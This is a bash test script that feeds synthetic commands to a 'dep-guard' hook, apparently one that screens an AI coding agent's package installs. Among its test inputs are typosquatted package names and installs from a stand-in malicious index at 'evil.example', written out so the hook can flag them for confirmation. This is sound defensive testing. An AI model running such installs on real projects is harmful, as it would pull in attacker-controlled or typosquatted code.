#!/usr/bin/env bash
# dep-guard hook'unu sentetik girdiyle dener (claude gerekmez).
set -uo pipefail
H="$(cd "$(dirname "$0")/.." && pwd)/src/hooks/dep-guard.py"
fail=0
run() { python3 -c 'import json,sys; print(json.dumps({"tool_name":"Bash","tool_input":{"command":sys.argv[1]}}))' "$1" | python3 "$H"; }
ask()    { out=$(run "$1"); if grep -q '"permissionDecision": "ask"' <<<"$out"; then echo "ok   sorar   : $1"; else echo "FAIL sorar   : $1 -> [$out]"; fail=1; fi; }
silent() { out=$(run "$1"); if [ -z "$out" ]; then echo "ok   sessiz  : $1"; else echo "FAIL sessiz  : $1 -> [$out]"; fail=1; fi; }
silent 'uv add aiosqlite uvicorn jinja2 python-multipart httpx yt-dlp defusedxml tzdata'
silent 'uv add --dev pyyaml playwright'
silent 'uv pip install requests'
silent 'pip install "requests>=2.31"'
silent 'python3 -m pip install -U rich'
silent 'npm install -D vitest @types/node'
silent 'cd backend && uv add "fastapi[standard]"'
silent 'FOO=1 pnpm add zod@^3'
silent 'cargo add serde'
silent 'brew install jq'
silent 'uv add --group lint ruff'
silent 'pip install -r requirements.txt'
silent 'pip install -e .'
silent 'go get github.com/x/y'
silent 'uv add some-new-niche-lib'
ask    'uv add reqeusts'
ask    'pip install requestss'
ask    'npm install lodahs'
ask    'pnpm add expres'
ask    'uv add git+https://github.com/x/y'
ask    'pip install "git+https://github.com/x/y"'
ask    'pip install --index-url https://evil.example/simple foo'
ask    'uv add --index https://evil.example/simple foo'
ask    'npm install github:x/y'
ask    'pip install https://x.example/pkg.tar.gz'
ask    'ls && uv add djnago'
silent 'uv sync'
silent 'npm install'
silent 'npm ci'
silent 'uv run pytest'
silent 'echo "uv add reqeusts"'
silent 'git commit -m "uv add reqeusts"'
silent 'make check'
silent 'pip list'
if printf 'xx' | python3 "$H" | grep -q .; then echo "FAIL bozuk girdi"; fail=1; else echo "ok   sessiz  : bozuk girdi"; fi
if [ $fail = 0 ]; then echo "PASS"; else echo "FAILED"; exit 1; fi
